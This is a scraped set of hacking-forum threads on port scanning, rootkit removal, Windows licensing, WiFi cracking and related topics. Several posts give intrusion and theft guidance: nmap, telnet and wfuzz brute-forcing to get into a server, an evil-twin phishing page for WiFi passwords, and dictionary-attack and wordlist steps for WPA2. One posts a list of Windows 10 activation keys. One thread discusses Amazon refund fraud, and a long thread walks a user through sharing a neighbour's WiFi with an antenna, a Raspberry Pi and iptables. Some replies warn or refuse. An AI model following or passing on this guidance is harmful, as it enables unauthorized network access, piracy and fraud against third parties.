I'm just elaborating on your post.  QuoteYou need to be able to communicate with the hosts in order to scan them. If the only way is via internet you might have a hard time with NAT.   Of course he needs to be able to communicate with the hosts. It doesn't have to be direct communication, it can be done through proxys or forwarded ports in a NAT router, but it's still communication with the host. Scanning implies connection, and if he can connect, then nmap is the prefered tool for scanning.    If he can't communicate he can't scan. Period. That should be kind of self explaining.
jyggorath bro can you tell me how to do this through proxys or forwarded ports please??                       Edited by haxor024 (Tuesday 16th of August 2016 12:58:49 PM)
Tell me more about the target host first.
here's a trick i know first download nmap then type the IP address of the computer/server you want to hack once you got the ports and ip you can do telnet on cmd ex. telnet 188.65.115.177 21 then you get a login screen. Usually the login is not really hard if it is hard you can use a brute forcer tool, I like to use wfuzz. Once you got it you can access the server's database and/or files.

Dear Evilzoners,            I am a rootkit victim, I need help of get rid of some hidden murderers targeting at me.    The situation I encountered is as following.    I am a windows 7 x64 user. As contending with my enemies, I have installed a pretty good anti virus software and a firewall, I have opened all my monitoring tools for detecting intruders, as some anti rootkit tool, process monitor, process explorer, tcpview etc. sysinternal tools. I have mened all the patches of windows system. But it turns out my enemies still lay a hand at my system.    The symptons are they occassionally attack by flooding the process monitor, I mean they cause some read or write disk or some process monitored by process monitor to run frequently so in the end process monitor eat up all memory and my system broke down. Sometimes they modify or delete folders or files on my system, I have verified this. Sometimes they modify the firewall configuration in registries, that is detected by anti virus software. Although I have mended all the patches of my windows system, but occasionally I have to remend them. Every time I start up my operating system, my rootkit monitor tools report some of my FSD(file system driver) entries were hooked by unknown address. Those enemies seem very interested in what files are on my file systems and what new files are copied to my file system.    I wonder if someone could guess what the techniques and tools my enemies are using and how can I deal with them?    Best Regards,
Just reformat your box, rootkit is gone.

Unless you just happened to keep a log of all the hashes of every file, and examine it at the hardware level, formatting is still the #1 option, even if it's not the most convenient. Of course if you're putting content on a webserver that you downloaded from 3rd party sites, chances are it was already loaded with backdoors.
What in the hell were you doing to get such a infection? Things like this in my opinion after working at a computer repair store for 3 years only happen when kids discover torrents or people start downloading porn?

I want to say we've had this same exact discussion before.   oh wait...we have.   Alas, on the old forums but still the answers given that you want to ignore is what you need to do.    Format your disks start from scratch.  I'd bring NO data over from your current build.     When your not at your computer, turn it off.   10 years in IT support, and after the first few times of trying to remove a virus from a system only to find that it's remnants stay or the system just never is 100% after I thought it was remove, the best course of action is to format and start over.

If its truly like you say it is then you should definitely secure your network first, otherwise its gonna keep happening.. Like Katheudo said, give us more info. Is it happening at home? work?

Quote by piratesailorCurrently mainly at home, they hacked my laptop, rooted my mobile phone and harrased me a lot and stay in dark I cannot reveal them.  As everyone has been saying, format your computer and any other computer on the network. After that reset your phone to the factory default, if it's been rooted then you'll likely need to get a copy of the original firmware and reinstall it. Then, change your network's external IP address, you may need to talk to your internet service provider to do this, then close any ports you are not using and update the firmware on your modem and routers. After that, try to avoid any sites that contain or are related to pirated or illicit material. Any files downloaded from these sites have an increased probability of containing some kind of malware. If you connected to the network at your workplace with your laptop or phone while either was infected, then I would recommend you immediately notify your supervisor so they can decide upon the necessary precautions until they are sure whether or not their network was infected.   Edit: @Katheudo, thanks for reminding me, I completely forgot to rant about passwords:  Change the passwords to all your accounts, and, if you can, monitor the accounts for any unrecognized activity. As for passwords, change all of them to different 12 - 16 minimum character length passwords. A tip for easy to remember passwords with high entropy: use random words separated by spaces. Ex: correct horse battery staple. (Don't use this, if you need help creating a password, open up a dictionary and choose a few random words, or use a random line from a random book that you don't own.) Also, never store your passwords on your phone or computer, even if the file is encrypted. If you must, write the password down on a piece of paper and tape it to the bottom of your desk, or table, or somewhere people won't look. You can also log into your account regularly until you remember the password, and then get rid of that piece of paper, I recommend a really good shredder or fire, and make sure to never allow your phone or browser or any software to save your login information, the inconvenience will help keep your accounts secure.

I hope for you're own sake you take action with the advice already given. But my other suggestion is why these people are targeting you, in my opinion a hacker will not invest time and effort to attack one person like you, they must be aiming to get something from you, that is why I was asking if you had a company... My point is protect your bank, loans, personal information, passwords, files etc... You must of become a target somehow, either through malware and viruses which would be my main and most likely answer to the root of this issue you are having.

Everytime I reinstall my operating system, they infect it almost immediately. They have messed up my life.

You can use Windows 10 without a key, it seems like the only restrictions are a few watermarks asking to register, and you can't change your background. Here's how:    http://www.howtogeek.com/244678/you-dont-need-a-product-key-to-install-and-use-windows-10/      You can always just search online for keys with keywords like "windows 10 activation" or "windows 10 keys" to find some. Here's a few I found:   Windows10 Professional  PW48G-MNG8W-B9978-YWBRP-76DGY  Windows10 Enterprise  QRHN6-BPG93-FW2WR-JY4YP-MP2JR  N6TWR-9M9PP-3H67R-78FKH-YY48R   Windows 10 Home - TX9XD-98N7V-6WMQ6-BX7FG-H8Q99   Windows 10 Home N - 3KHY7-WNT83-DGQKR-F7HPR-844BM   Windows 10 Home Single Language - 7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH  Windows 10 Home Country Specific - PVMJN-6DFY6-9CCP6-7BKTT-D3WVR    Alternatively, you could download an older version and upgrade, although I believe Windows 10 free upgrade is now finished.    Hopefully this helps.
I've always heard that you can use "Windows Insider" versions to have your Windows activated while you do all the updates and stuff.   But you know what that means, some bugs, and a really big report of whatever you do with your computer to Microsoft.   Farewell.  --Slendeh

So i take it that what ive read in a couple of places advising people to keep away from Win 10 cos its supposedly got its own keylogger fitted and some other sort of spyware, mainly for keeping an eye on the user isn't true ?

But we still don't know for sure if Windows 10 has its own key logger. However, in the beta version Microsoft stated that its OS did have a key logger and did use that information to help the development and testing process. Not sure if that was left in...   If you take a read here http://www.pcworld.com/article/2974057/windows/how-to-turn-off-windows-10s-keylogger-yes-it-still-has-one.html they stated that in the Microsoft privacy agreement that they log speech, writing, ink typing etc...

Your tutorial has way too less informations.   Just saying what you wrote will DEFENITELY NOT get you the refund. It's not that easy anymore. If you guys want, I can make a big tutorial regarding Amazon Refunding.
Yeah dude. I would like that.
Would definitely recommend moving this to Social Engineering section if we even want something this low quality
Also don't you have to sign for things from Amazon now? Plus even if you don't have to sign, the driver might scan the package off to say its been delivered...

Right now I'm more into program.ing, but I'd like to know how to start finding and understanding them.
Hey man, I would look into 1. Port scanning, 2. Vulnerability assessment and 3. Exploitation. The common 'go-to' tools for these are Nmap, Nessus and Metasploit.   A  thing I liked to do is to get a copy of Metasploitable 2 or an old unpatched Windows XP sp1 and 'break' these. Try and see how you can attack each open port.   Look at the output of Nessus and analyze the vulnerabilities it found. I'd also check out vulnerabilities such as MS03-026 and MS08-067 (the king!), they're abit historic but are still found in the wild today.
I recommend you fully recon the target first. Finding out everything about the target's DNS is the most important thing to do. This will help you to have many more angles to attack once you know the network layout. You'll also need to find if the site has any subdomains. This will give you more ip addresses, which leads into the target having possibly more vulns to check out.  Easy to do.   open linux (debian) terminal:   sudo nsrecon target.com   That will give you the dns info   Then..   sudo theharvester (then i will explain how to use it)
Thanks for your time.
honestly it would helpful to know what you know about networking. What type of experience do you have with networking?
I'll start learning networking next year with school, still, a guy is helping me out explaining me the theorical facts about networking, we haven't started yet. All I know is pretty standard, I know topologies, the most known protocols, how a network works, nodes, transmission media's,  client, host, in addressing and subletting,  but my knowledges don't go further than theory.
before getting into vulnerabilities. You should learn how everything works on the network. Lab some stuff up on virtual machines and play around.
I'm about to start learning a lot with this guy, too bad I can't set up a virtual machine, I tried several times but it won't work anyhow.
it didn't work? try harder, figure out why it didn't work. ask people to assist with whatever its not doing. But, if you're going to just give up when it doesn't work, your going into the wrong field...
It's not like I haven't tried it, I never gave up, tried several times 2 months ago, when I failed I tried and tried with no success, when I found someone willing to help me hosting one I still wasn't able to make one. Along with that I tried to host a virtual machine exactly 10 times, and with 3 different computers.

Or maybe your CPU doesn't support it.                       Edited by FullSpeed (Monday 8th of August 2016 12:39:10 AM)
It's the CPU for sure, display turns black whenever I try to run Kali.
what are the specs on your computer? what OS are you running? what Hypervisor?
Setting up virtual machines is super important. Well in this field atleast. You will find yourself breaking vm's left and right. Why isn't it working? is there an error once you boot it up? If so what is the error? Have you tried using different software? We can also help you if you have proven to try yourself; and give us an indication as to what is wrong, but something as simple as this should really be a no brainer. Get Cisco packet tracer labs and GNS3 to get the grunts of setting up cisco devices. Note you might want to purchase some hardware along with this since you might not be able to perform certain high level functions in these labs.
If you're having issues with setting up a VM, download the VMware/VirtualBox image pre-built. Try using Kali Linux, you can't mess up the setup (there isn't any besides CPU and RAM config) if you get it pre-built, with a clean install of your choice of virtualization program. Download page is https://www.kali.org/downloads/
Your best bet to cover vulnerabilities is to look into Buffer Overflows first. If you are already into programming, I am hoping at least C or Python, you can find some older progz to exploit. There are a bunch of tutorials online that you can use as a guide. Use WinXP first on VM due to it not user ASLR or DEP...You will need Immunity Debugger and mona modules.   Now you mentioned it does not work but try VMWare Player or VirtualBox. If you are receiving an error use google.com to locate the issue and fix it.    hxxp://lmgtfy.com/?q=vm+machine+setup   There is a time to have your hand held and there is a time you must face things on your own.
Steps  to take    READ everything about security  Practice-  ASK questions =) no question is stupid.
Never give up dude. from fails you become positive. and is a learning experience .
Some people don't know how to start. or dont know what should they do after read many articles/book about security. Or dont know where place to practice (like me).   Remember, practice on your own network, not on public network. Because that's illegal.
you can play with metasploitable vm,and exploit it using metasploit

Thanks for your tutorials (the whole package) giving a background on different types of malware, and consequently different approaches to analysing malware.   More advanced tutorials to come ?  I would love to see a tutorial on reversing and analysing an APT or a malware that uses anti-forensics techniques.  Anyway, great job !

Actually all of these malware related writeup are from Deque. It was available in the old EZ.   I am surprised that there is no attribution of her.   I guess as EZ was out of service for quite a long time made the experienced members quit.

Thanks for your tutorials (the whole package) giving a background on different types of malware, and consequently different approaches to analysing malware.   More advanced tutorials to come ?  I would love to see a tutorial on reversing and analysing an APT or a malware that uses anti-forensics techniques.  Anyway, great job !

Best bet is go take a look at our eBook board. Plus you may want to Google "Reverse Engineering" which is probably what you will be doing if you wish to become a malware expert, unless you just want to monitor what malware samples do in a sandbox.
After you learn binary analysis and reverse engineering, as well as have a solid functional understanding of programming, go read Practical Malware Analysis

Newbie here... How to save this malware without affected by itself?
my apologies in advance if...  first post and I am solely looking for help in getting revenge on Internet scammers.  I hope someone can help.  Even though I can fly the B777, B767, B757, B737, and B727, I am an absolute total and complete noobee here.  I took Fortran back in the Eniac days, but that's about it...  I take it personally when scammers try to steal my money (and other honest people's).  I sold an item on Craig's list and got 2 replys from scammers using the "I'll buy it and send you a cashiers check, but you send  money to the "shipper" and then the original check bounces...  Is there a way that I can send the scammer, now that I have a rapport, either a highly destructive virus or a worm that can identify them to law enforcement?  I was thinking of a link that I can say is the details of the western union money transfer, but actually is the virus/worm/Trojan horse.  Is this possible?  Thank you in advance...  Sent from my iPad
I feel for you and applaud your effort at attempting to join a hacking forum with hopes of getting some retribution.    Its not going to work the way you want it to. This is just another one of lifes lessons.   Don't sell or do business on Craigslist. The users that scammed you most likely use 1 time accounts, you can try to complain to Craigslist but they will also probably tell you to be more careful.   If you got nothing better to do but hold on to your stubborn need to exact revenge, then I suggest learning about what you could do in the future. By the time you figure out how to Dox the people that did you wrong and social engineer them into trying to scam you again (after you have your phishing/malware site up and tested) it will have been too late.
19 views so far, but no answers.  Can someone at least tell me if I'm barking up the wrong tree??
Sorry to sound like such an ass hat but you say you can fly a B737, yet you cannot understand the fact that accepting a check is risky and should never be done on sites like eBay and Craig's List... Plus you came onto a hacking forum posting threads from your iPad as it states at the end of the post.   Like 0E800 it won't work out for you. No one on this forum (probably) is going to hack, dox or infect some random "Scammers", for all we know you could be lying and trying to trick people into hacking/ doxing someone else for a totally different reason you gave us. Life is tough.                       Edited by Katheudo (Saturday 10th of September 2016 03:58:11 AM)
OE800--thank you for your reply!  I was not scammed--I saw it coming, but others won't.  I sold my race bike trailer on Craig's list successfully to (obviously) a genuine buyer.  I have been corresponding with 2 scammers through text and email.  At this point, they believe that I am going along with their plans, and I think they may let down their guard.  The more time and their resources I waste, the less they can do to others.  I just think it would be awesome to turn the tables--maybe make them pay to free up some ransomware that is keeping them from continuing...  I'd donate it to charity if I can't get them caught and prosecuted.
Katheudo  Well, you did come across as a bit of an asshat, and you didn't read my original post closely either.  As I said in my reply to OE800, I wasn't scammed, I'm just trying to help others...  if you can help me, other future potential victims will be thankful.  I'm naive here, so if you have a way to tell if I'm genuine or not, I'm game...

If you want to learn how to hack, then you are going to have to be committed. Also, the idea of you fucking with scammers seems kinda like a waste of time. Worse things happen to people, than being scammed out of some money.     To me it just seems like you will have to accept your loses, and move on. Though I encourage you to stay and learn about hacking. It is quite fun, and could help you avoid losing money from scammers and hackers in the future.
Truecam,   Thanks for your reply, but as I said, I haven't had any losses, other than the time I've spent (and that's entertaining in a strange way).  I know my time constraints and interests and know my limitations--I'll never be a "hacker."  You guys have way more smarts and time invested than I ever will.  I was just hoping to screw with these assholes that take advantage of naive, normal people. Thanks again for your reply.

WPS Pin bruteforcing has pretty much been patched by all major players. Pixiedust/reaver are really the only ones that go after wps pins. Pixiedust is offline where as reaver is online. Reaver usually locks out on most routers these days and pixiedust is offline, again patched. Dictionary attacks on a 4-way handshake are still feasible but its rare to get a hit. That leaves the final most viable method which is more of an evil twin/mitm/se technique. This technique however involves needing the proper hardware and a powerful antenna. This method will require you to clone an AP, overpower said AP, then create a phish page requesting the wifi password to load the internet. Would help to know the ISP to create an ISP themed phish page.   WiFi cracking is essencially dead without a new exploit that say, breaks wpa2 encryption.

is there any vulnerability in wpa 2 except (wps)   #No_system_is_safe
I'm assuming you want to access a wpa2-psk encrypted network, which is possible without the password, but seeing as doing so without the explicit permission of the network owner is illegal, that's probably all I can responsibly say. So, if you want to learn how to do it, you'll likely have to ask your questions elsewhere.

I didn't know that, wow.    I thought the only way to get (unwillingly) access to a network is by cracking it. Guess I somewhat learned something today
The simplest way would be to crack the hash, but unless I'm mis-remembering, there are other ways in, just a bit more difficult.

If you keep it ''theorical'' it's all good, I mean, after all he never said he wanted to crack a wpa2 he just asked, might also be curiosity.
The issue with a theoretical conversation is that, theoretically, it can be applied to reality. So, if I were to explain, theoretically of course, that all you had to do was listen for and capture the data from a four way handshake then perform a basic dictionary or brute force attack and you'll be golden, all that would be protecting the good citizens of wherever he is from is the hope he won't understand what I'm saying or won't know how to do it. That example was hypothetical and theoretical and all that stuff of course, there's no need to go out and try it... please don't go around trying to do it.
Thats all nice and all but the brute force cracking is pretty unreliable in the fact that it can take "theoretically" years so I am not sure that people cracking wifi is that much of an issue, but I may be completely mistaken and if I am tell me I don't want to be spreading false info here, especially here
You're exactly right, brute-forcing a WPA2 is not a smart way to go.   @youcef Aircrack-ng is the most common set of tools for what you want to do. Take a look at them, there's plenty of documentation and tutorials.                       Edited by Kurajber (Thursday 4th of August 2016 05:18:25 AM)
Yeah,you're right, theoretically it could take years, but considering that the average password is often around 8 characters it could take anywhere from a few minutes to trillions of years depending on the complexity of the password and if it's being salted. Also, brute forcing a password is generally a last resort, a dictionary attack is far more common, because you can check the hash against a list of common passwords and their variations, which, if you're using a common password, could turn a trillion years into a few minutes. Also, if you're trying to think of a secure password, using random clusters of words or even using sentences, increases the entropy of a password, and will often decrease the applicability of dictionary attacks due to the unpredictability of the password as a whole. Sentences and word clusters are also easier to remember than a single word with random alterations.

Considering all facts and comments I understand what you are saying however is very possible as I can confirm haven done so to my router and others that I owned for testing purposes only and is very easy I was on the router in under 3 minutes using the pin number of the router is not that secure at all and was very shocked myself when I tested it on my own equipment. and to know how easy it was to get the tools to do such as task was concerning but pleased to know as I love solving problems in technology and seeing how hackers get in to systems.   I have over 11 years experience and still learning today.
Hello my friends!   I use Linux kali 2016.2 and boots with usb.Jag try to run a pixiewps dust attack on one of my routers but can not until WPS code.

So, if you want to learn how to do it, you'll likely have to ask your questions elsewhere.  For like two seconds I felt excited... I have been too long away from wifi hacking but I'm pretty familiar with the maths behind WPA2 and I can say (and please, correct me if I'm wrong) that social engineering is by far the best way to get a WPA2 passphrase. Of course, you can try "brute force" and with the "" I mean that I only consider this method with small and well design dictionaries. For example, if you know the router's owner's name, age, etc., etc. you can use several applications (or event write your own script) to generate a small dictionary (less than 200 MiB). I also try with some general, small and very known dictionaries. But there's no point in using dictionaries of GiBs or even TiBs (yeah, there are some crazy torrents out there with huge dictionaries) becuase you'll be loosing your time and probably won't get the passphare. Also, you can try with online services such as http://www.onlinehashcrack.com/
@privacy: If WPS is off then you cannot use reaver. Also, modern routers will lock WPS after few incorrect tries, so you can only use reaver with relatively old routers. You can also try to reset the router when it gets locked but that'll take you a lot of time. Again, social engineering is the best options in those cases.  By the way, better use airodump -WMU (-W == --wps, -M == --manufacturer and -U == --uptime) so you can get more info and in "real time" in case the router get locked.

So many clueless noobs, no bruteforcing won't take a trillion years  xD    If you have the right hardware, that is a strong or mediocre gpu - bruteforcing as in dictionary attacks is quite feasible but be careful about power usage. It might end up costing you more on your electricity bills than paying for the wifi in the first place.    Let's say if you have something like gtx1080, which is a top tier card at the moment. You can bruteforce a 13gb wordlist in less than 40 mins using ocl hashcat.   And if you don't want to do it yourself there are a few cloud based bruteforcers which are also free, so you can just put your handshake there and let it crunch the numbers for you.   If you wanna go even more advanced, personalize your wordlist to match your setting. For example use a localized version of the dictionary with words that are in your local language but written in English or use custom wordlist generator which permutates your wordlist based on the supplied information that you know about your target. Also you can generate phone number list of the popular telecom companies in your area to use as wordlist using crunch, as phone numbers are also commonly used as passwords.   WPS, PixieDust, all those attacks most of the time may or may not work but should only be used as a last resort.   For the most part, going with easy to crack ones is more efficient than wasting time on those that seem difficult. But in the end it might give you some sort of "inner peace" if you finally manage to crack something that seemed uncrackable for so long.    I'm not saying it is alright to crack your neighbours wifi, that is a moral dilemma that you need to deal with and that is your choice to make. I just gave a list of all the possibilities.   All this effort is not worth it in the end if all you're after is access to a mediocre internet connection. If you are not financially well off and you can not afford your own wifi that makes sense. What you lack financially you can make up for it in technical skill, fair enough.                       Edited by f474a (Sunday 9th of October 2016 06:03:31 PM)
Its not hacking it's cracking , there is 2 ways to do that 1st cracking using a wordlist (brute force) after capturing the xx.cap "handshake file" aircrack have to done with the job or john or any cracker , 2st Social engineering , Goodluck.
you can monitor the traffic using airodump until you get the handshake, after that, you can crack it using aircrack-ng
Holy shit, did I just get transported back to 2008?    Brute force: Attempts to determine a secret by trying every possible combination.    Dictionary attack: Uses pre-compiled list of passwords with hopes ones matches exactly.   If you were going to Brute force, you really aught to create your own rainbow tables.    Typical routine for manually cracking WPA2:  Put wifi in monitor mode, capture packets, send death, capture handshake, use dictionary against handshake.     ATT for the longest time used the home phone number as the password.   Create a phone number password list for your local town: Codeseq 5101000000 5109999999 > phonenumbers.txt            .CodeMirror {height: auto;}      var element = document.getElementById("code-WS66zf9vKP");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });       Where 510 is your area code, will create every possible combination of phone numbers for that location.

Quote by ArmorTacoThe simplest way would be to crack the hash, but unless I'm mis-remembering, there are other ways in, just a bit more difficult.   Is it possible without dictionary attack ? how ?
so after all.. is there any known method which work in cracking this wp2 psk ? forget about aircrack-ng i tried all possibilities with it.. pixie dust, etc .. brute force unless you have 10 high powered pc to link them together don't even think about.   theoretically" its my own router which i want to learn with.
i would be very grateful if anyone could help me with this, by some documentation etc...

Hey there SupremeNoob, welcome to Evilzone     The router you are talking about might simply not be vulnerable to the attempted attacks.   What do you mean by the first 8 characters of the total 26?   Anyway, breaking a 26 alphanumerical password by brute force is highly unlikely. You are better off trying to attack the software itself. Not very big on wireless security myself, but I am sure you can find someone around here that is.     EDIT: Oh yeah and I merged your two posts into one.

I am not entirely sure what situation you are in here. Are you trying to crack the wireless password you need to connect or are you trying to crack some management login? If you are trying to crack the wireless password, I am not of much help and there is not really that much you can do (except the things you have already tried I think, wps vuln etc). But if you are already connected and can access some sort(s) of management login, there is more ways to attack this thing. Does it have a web panel? SSH? Some sort of telnet management?                       Edited by ande (Friday 28th of October 2016 04:51:19 PM)

I think its over hyped. You can achieve the same by buying a PI, adding some batteries and an alpha antenna with post installed arch - and open source tools used in pretty much the same way as the pineapple. One that did impress me though was the pwni device https://store.pwnieexpress.com/product/pwn-pro/. I used one of these in an engagement recently. Although I wouldn't by either of these 2, the latter was really cool.
Man some of that pwnieexpress is pretty high priced.   Would think that pwn-pro you could build for a whole lot less.
They are all over priced yeah. You could do pretty much the same by yourself. Thats why I wouldn't purchase it myself. But they do have some nice WEB UI's for their vulnerability scanning and reporting. I can see enterprises using this, although something like bluecoat and elastica would do a better job at most of this.

So there's my Neighbor with WiFi, and I have got his WiFi Password, but the range isn't that well. Meaning I can only reach his WiFi from the room closest to his house. I think of buying a directional antenna and pointing to his house and then connecting it to a router and making it wireless to my house. Any better suggestions?
This suggestion is good
Quote by 3v3rThis suggestion is good   The one that I offered?   Also, the Antenna that I would purchase would have an output wire, what would that be? I first thought it would be ethernet, meaning I'd simply plug it into the router and it'd make it wireless just like that, but I guess that's not the case, so i was just curious what output wire a directional antenna has.   (EDIT)  P.S.: The distance between my house and my neighbor's is no more than 50 meters. From the other edge could be more, but still no more than 100. From where I would put my antenna is less than 50m though.                       Edited by NullSec (Thursday 11th of August 2016 11:17:10 PM)
Quote by NullSec    I first thought it would be ethernet, meaning I'd simply plug it into the router and it'd make it wireless just like that, but I guess that's not the case, so i was just curious what output wire a directional antenna has.     You're messing things up. You'd plug in antenna into your router if you wanted to increase its transmitting power. What you want to do is increase your computer's recieving power. And that's the job of your Wi-Fi card. That means, you have to connect your antenna with the antenna port on your card. That is most commonly done using a pigtale cable.
Coaxial and ethernet output cables are usually only used to increase the transmission range. If the antenna is intended to have a larger effective receiving range, then it would most likely output on usb. If it does use usb and you want to connect it to a router, you would need to connect the antenna to a computer, and the computer to the router, and configure ip forwarding.
Update:   We got the antenna hooked up at a location of the house, I checked the signal and we locked the antenna in place where it got the best signal.   I happened to have a TP-Link TL-WN722N Adapter (had it to crack Wi-Fi's) and I connected the RP-SMA cable to my adapter (after removing its own little antenna). I checked with a Speedtest and the signal got 3 times better than my computer's built-in antenna.   A "professional" happened to come over and brought a couple of routers, and told me that I needed a pigtail cable to transfer the antenna to Wi-Fi, but then got another idea, which was to connect the RP-SMA cable from the Antenna to router A (which has an RP-SMA input) and then get an Ethernet cable and connect router A to router B. So router A has the internet connection and distributes it to router B which makes it Wireless.   So; Antenna -- RP-SMA --> Router A -- Ethernet --> Router B -- Wireless --> Computers, tablets etc.   Would this work? Let me know what you think of this.
Assuming router A is a quasi-modem, it should work fine. Otherwise, router B will need to have bridge or repeater capabilities, and then it would just be a matter of mirroring several config values, and assigning different channels.
Note that repeaters are gonna impair a sizeable decrease in speeds.

Depending on what you want to spend AlFA makes a awuso36h they also make a R36 usb router. set up as repeater.   Set up a DDWRT router as a repeater in the room that gets wifi and repeat out.....
If you're planning on stealing your neighbors wifi, set up a router with Tomato or DD-WRT. These aftermarket router firmware will enable you to set up a router as a repeater. You punch in your neighbors info, have your antennae located to have the best signal and then repeat their signal for wifi (you can use your own network name and password, or the same) and also hardwire to the router. Repeated signals arent the best for network speed, but short of tapping into their router via a hardline is going to be your best bet.

Use the internal wifi to broadcast what your external wifi is piggy backing from your neighbor. Connect your devices to the SSID your old laptop broadcasts.   You neighbors WIFI is violating your airspace, its up to you do with it what you want.     Well I do have a Raspberry Pi which I can use. I've also got 3 access points, one of which is so outdated that it cannot connect to non-WEP networks (neighbor's wifi: WPA), the other one I'm having a hard time configuring (keeps saying "ethernet cable connected", and "ethernet cable disconnected" etc. even though it's not), and the other AP has a little antenna that cannot be removed, meaning I cannot plug my antenna in there.   I am afraid that the Raspberry Pi won't have enough built-in power to distribute the network to the entire house. So since I've got that one outdated AP that I don't really need, could I have the raspberry pi connected to the antenna via a TL-WN722N Adapter that I have, then send that into the AP, and from there distributed to the house?   Would that be possible? If so, how?   Thanks in advance.
I think your PI will work. You just need to adapt the instructions that call for Eth over WiFi to be Wifi over wifi. So you have one wifi adapter bringing the internet in, the other sending it out.

I read this Tutorial but it didn't make much sense... Could you possibly explain this here, since you seem to understand it a bit better than me?
On your raspberry pi, open /etc/sysctl.conf and remove the "#" from the begining of the line "net.ipv4.ip_forward=1". Save the file, and then run the following commands:  sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward".  sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE    sudo sh -c "iptables-save > /etc/iptables.ipv4.nat"   Then edit /etc/rc.local, add the following line just above "exit 0":  iptables-restore < /etc/iptables.ipv4.nat   Go to /etc/wpa_supplicant/wpa_supplicant.conf and add the below information: (Note: Do not remove the quotation marks.)  network={      ssid="Insert Network SSID Here"      psk="Insert Password Here"      key_mgmt=WPA-PSK  }   Now in /etc/network/interfaces you will need to configure your networks that you will be using if you haven't already. Example is below:  allow-hotplug eth0   iface eth0 inet static       address 172.24.1.1      netmask 255.255.255.0      network 172.24.1.0      broadcast 172.24.1.255   allow-hotplug wlan0  iface wlan0 inet manual      wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf   After all this, you should only need to configure your access point to broadcast an ssid, connect the ethernet cable, reboot the pi, and connect to the new network.

Sorry, should be:  sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
Alright, I fixed the command typo, but now I'm stuck at the (almost) last step:  Quote by ArmorTaco  Now in /etc/network/interfaces you will need to configure your networks that you will be using if you haven't already. Example is below:  allow-hotplug eth0   iface eth0 inet static       address 172.24.1.1      netmask 255.255.255.0      network 172.24.1.0      broadcast 172.24.1.255   allow-hotplug wlan0  iface wlan0 inet manual      wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf    What I tried...   pi@raspberrypi:~ $ sudo nano /etc/network/interfaces  Code  # interfaces(5) file used by ifup(8) and ifdown(8)    # Please note that this file is written to be used with dhcpcd  # For static IP, consult /etc/dhcpcd.conf and 'man dhcpcd.conf'    # Include files from /etc/network/interfaces.d:  source-directory /etc/network/interfaces.d    auto lo  iface lo inet loopback    iface eth0 inet manual    allow-hotplug wlan0  iface wlan0 inet manual      wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf    allow-hotplug wlan1  iface wlan1 inet manual      wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf                  .CodeMirror {height: auto;}      var element = document.getElementById("code-ZWO8Qyndjm");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        What exactly should I edit there, exactly..? Could you explain a bit more on what I should edit, since you know my case?  Do note that I am receiving my neighbor's network using my network adapter (wlan1), and not wlan0.   [EDIT]  I forgot to mention, I am executing all these commands via SSH, so I've connected my Raspberry Pi to my Mac via Ethernet. I hope it doesn't mess anything up.                       Edited by NullSec (Wednesday 24th of August 2016 07:34:19 PM)
If you're using wlan1 then run these commands:  sudo iptables -t nat -A POSTROUTING -o wlan1 -j MASQUERADE  sudo sh -c "iptables-save > /etc/iptables.ipv4.nat"   And in /etc/wpa_supplicant/wpa_supplicant.conf make sure that the first ssid is whatever you want wlan0 to connect to and the second is your neighbors network information:   network={  ssid="wlan0 SSID"  psk="wlan0 Password"  key_mgmt=WPA-PSK  }   network={  ssid="Neighbor's SSID"  psk="Neighbor's Password"  key_mgmt=WPA-PSK  }   I edited your /etc/network/interfaces. The code below should be fine to use. You can change the address, netmask, network, and broadcast if you would like, but it should work fine as is. Code  # interfaces(5) file used by ifup(8) and ifdown(8)    # Please note that this file is written to be used with dhcpcd  # For static IP, consult /etc/dhcpcd.conf and 'man dhcpcd.conf'    # Include files from /etc/network/interfaces.d:  source-directory /etc/network/interfaces.d    auto lo  iface lo inet loopback    iface eth0 inet manual  allow-hotplug eth0  iface eth0 inet static  address 172.24.1.1  netmask 255.255.255.0  network 172.24.1.0  broadcast 172.24.1.255    allow-hotplug wlan0  iface wlan0 inet manual      wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf    allow-hotplug wlan1  iface wlan1 inet manual      wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf                  .CodeMirror {height: auto;}      var element = document.getElementById("code-u1cVs7Nu0E");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });
Alright, I did everything rebooted the Pi via SSH, as soon as I did that, I unplugged the ethernet cable from my computer, plugged it into the router, waited a few minutes for the Pi to boot, I connected to my router via Wi-Fi but I am not able to connect to the internet. Is there any configuration I am supposed to make, or...?   Also, when I connected the ethernet cable back to my computer and SSH into the Pi, I do: ping google.com but I get 'unknown host'...   Maybe any of this helps?

I may have to actually connect to my neighbor's Wi-Fi first using wlan1 first. Or undo the other commands (the ones you told me) I did before with wlan0...   Not sure.
Anyone able to help me?   I'm in real need and hurry on this...

Sorry, haven't done ip forwarding in a while, so I'm likely forgetting something. If anybody knows where I went wrong, I would appreciate the help.
The only problem I have now is with ifconfig, that displays wlan0 and wlan1: Link encap:Ethernet (have posted full ifconfig output on the thread). I think I have reset everything I changed regarding my network configurations.   I have reset iptables configuration (because I executed: iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE )   The only think I'm not sure how to reset is this: echo "1" > /proc/sys/net/ipv4/ip_forward   Maybe that's the cause of the ifconfing output.. Not sure..

Not sure..  sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward" is basically rechecking the value for ip_forward after un-commenting it in /etc/sysctl.conf. It just saves you the need to reboot your pi to have ip forwarding enabled.
